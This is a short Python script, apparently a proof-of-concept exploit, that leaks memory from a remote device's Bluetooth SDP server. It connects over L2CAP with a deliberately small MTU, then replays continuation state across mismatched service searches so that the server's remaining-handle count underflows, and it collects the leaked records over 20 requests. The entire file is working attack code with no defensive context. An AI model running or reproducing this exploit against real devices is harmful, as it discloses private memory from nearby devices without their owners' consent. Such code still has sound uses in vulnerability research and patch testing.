import btsock
import struct
import sdp

# This is required to assure than the SDP respones are splitted to multiple fragments,
# thus assuering that cont_state is attached to the responses.
MIN_MTU = 48
SDP_PSM = 1

# This function assumes that L2CAP_UUID response would be larger than ATT_UUID response
# (This will than lead to the underflow of rem_handles)
def do_sdp_info_leak(dst, src):
    socket = btsock.l2cap_connect((dst, SDP_PSM), (src, 0), MIN_MTU)
    socket.send(sdp.pack_search_request(sdp.L2CAP_UUID))
    response = sdp.unpack_sdp_pdu(socket.recv(4096))
    response['payload'] = sdp.unpack_search_response(response['payload'])
    result = []
    for i in range(20):
        cstate = response['payload']['cstate']
        assert cstate != b''
        socket.send(sdp.pack_search_request(sdp.ATT_UUID,
                                            cstate=cstate))
        response = sdp.unpack_sdp_pdu(socket.recv(4096))
        response['payload'] = sdp.unpack_search_response(response['payload'])
        result.append(response['payload']['records'])
    return result
